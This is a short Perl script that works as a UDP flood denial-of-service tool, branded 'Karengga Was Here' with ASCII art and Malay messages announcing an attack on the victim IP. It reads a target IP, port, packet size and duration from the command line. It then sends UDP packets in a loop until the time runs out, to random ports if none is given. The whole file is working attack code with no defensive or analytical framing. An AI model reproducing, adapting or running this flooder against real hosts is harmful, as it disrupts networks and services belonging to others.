#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

#######################
## Karengga Was Here ##
#######################

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "IP,PORT,SIZE,TIME/IP,PORT $ip\n";
$endtime = time() + ($time ? $time : 120);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD BLUE<<EOTEXT;

              ,
      _,-'\   /|   .    .    /`.
  _,-'     \_/_|_  |\   |`. /   `._,--===--.__
 ^       _/"/  " \ : \__|_ /.   ,'    :.  :. .`-._
        // ^   /7 t'""    "`-._/ ,'\   :   :  :  .`.
        Y      L/ )\         ]],'   \  :   :  :   : `.
        |        /  `.n_n_n,','\_    \ ;   ;  ;   ;  _>
        |__    ,'     |  \`-'    `-.__\_______.==---'
       //  `""\\      |   \            \
       \|     |/      /    \            \
                     /     |             `.
                    /      |               ^
                   ^       |
Karengga                       ^ 
EOTEXT

print "Semut Karengga Telah Menyerang IP $ip " . ($port ? $port : "Semut Karengga Telah Berjaya Mengigit IP Mangsa") . " Dengan " . 
  ($size ? "$size-Slammed" : "65500") . "Tentera" . 
  ($time ? " for $time seconds" : "") . "\n";
print "CTRL-C UNTUK HENTIKAN SERANGAN\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
